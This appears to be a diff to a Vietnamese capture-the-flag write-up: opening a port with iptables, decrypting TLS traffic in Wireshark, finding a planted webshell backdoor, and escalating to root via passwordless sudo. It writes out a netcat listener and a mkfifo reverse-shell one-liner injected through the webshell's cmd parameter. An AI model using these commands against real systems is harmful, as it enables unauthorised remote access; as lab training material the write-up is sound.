@@ -70,6 +70,10 @@ sau đó tôi tìm cách leo quyền
 
 có dịch vụ hoạt động trên cổng 41312
 
+sử dụng iptables thay đổi quy tắc để chấp nhận tất cả các kết nối đến cổng 41312 bằng lệnh sau
+
+sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
+
 tôi đã cố truy cập nhưng không thành công 
 
 <img width="1271" height="283" alt="image" src="https://github.com/user-attachments/assets/6cb0b857-2f79-435d-8231-45abad414846" />
@@ -103,3 +107,32 @@ quay lại wireshark và điều hướng đến Edit -> Prefernces -> TLS
 vào tùy chọn edit trong RSA Keys List và nhập IP, cổng, giao thức và vị trí của khóa vừa lấy về 
 
 <img width="1264" height="800" alt="image" src="https://github.com/user-attachments/assets/3a123d12-bb45-4ced-8b4c-71bf68e5ab42" />
+
+sau đó sử dụng bộ lọc http 
+
+<img width="1468" height="685" alt="image" src="https://github.com/user-attachments/assets/d3de9ced-6059-4e54-9135-40172d86e8db" />
+
+từ các gói tin thì tôi thấy được là có 1 hacker đã tải lên một webshell làm cửa hậu /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id để truy cập vào hệ thống
+
+<img width="1478" height="498" alt="image" src="https://github.com/user-attachments/assets/01352220-91f4-4c9a-ad95-8dff72c4ae84" />
+
+khởi chạy netcat 
+
+nc -lnvp 1234
+
+bây giờ sau &cmd= tôi sử dụng reverse shell 
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.108.226 1234 >/tmp/f
+
+nhưng không được nên tôi thử dùng cyberchef url-encode thành công 
+
+<img width="787" height="137" alt="image" src="https://github.com/user-attachments/assets/82c274b4-ace2-4360-a943-c489a60414ef" />
+
+ohh tới bước này thì khá dễ dàng cửa root mở toang rồi 
+
+www-data có thể chạy bất kỳ lệnh nào với quyền root mà không cần nhập mật khẩu
+
+và tôi đã có được cờ root
+
+<img width="584" height="249" alt="image" src="https://github.com/user-attachments/assets/d00a4ebe-4f32-4f51-a11c-9988471656de" />
+
